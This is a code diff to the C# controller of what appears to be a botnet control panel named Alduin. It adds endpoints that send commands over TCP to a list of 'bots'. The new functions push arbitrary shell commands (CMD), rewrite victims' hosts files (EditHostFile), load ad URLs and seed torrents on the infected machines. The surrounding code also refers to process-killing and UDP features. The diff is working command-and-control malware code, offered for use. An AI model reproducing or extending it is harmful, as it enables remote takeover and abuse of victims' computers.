@@ -200,6 +200,30 @@ namespace Alduin.Web.Controllers
             };
             return PartialView("_Udp", model);
         }
+        [Authorize]
+        [HttpGet]
+        public IActionResult Ads()
+        {
+            return PartialView("_Ads");
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult CMD()
+        {
+            return PartialView("_CMD");
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult EditHostFile()
+        {
+            return PartialView("_EditHostFile");
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult SeedTorrent()
+        {
+            return PartialView("_SeedTorrent");
+        }
         //Executes/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         [Authorize]
         [HttpPost]
@@ -627,6 +651,107 @@ namespace Alduin.Web.Controllers
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
             return Json(OverWriterResponse(response, botlist));
         }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> Ads(AdsModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Ads"
+            };
+            var Variables = new AdsVariables
+            {
+                Url= model.Url
+            };
+            var Command = new AdsCommand
+            {
+                newVariables = Variables,
+                newBaseCommand = method,
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(OverWriterResponse(response, botlist));
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> CMD(CMDModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "CMD"
+            };
+            var Variables = new CMDVariables
+            {
+                command = model.command
+            };
+            var Command = new CMDCommand
+            {
+                newVariables = Variables,
+                newBaseCommand = method,
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(OverWriterResponse(response, botlist));
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> EditHostFile(EditHostFileModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "EditHostFile"
+            };
+            var Variables = new EditHostFileVariables
+            {
+                Line = model.Line
+            };
+            var Command = new EditHostFileCommand
+            {
+                newVariables = Variables,
+                newBaseCommand = method,
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(OverWriterResponse(response, botlist));
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> SeedTorrent(SeedTorrentModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "SeedTorrent"
+            };
+            var Variables = new SeedTorrentVariables
+            {
+                path = model.Url
+            };
+            var Command = new SeedTorrentCommand
+            {
+                newVariables = Variables,
+                newBaseCommand = method,
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(OverWriterResponse(response, botlist));
+        }
+        //eccentric
         [Authorize]
         [HttpPost]
         public async Task<IActionResult> KillProcess(KillProcessModel model)
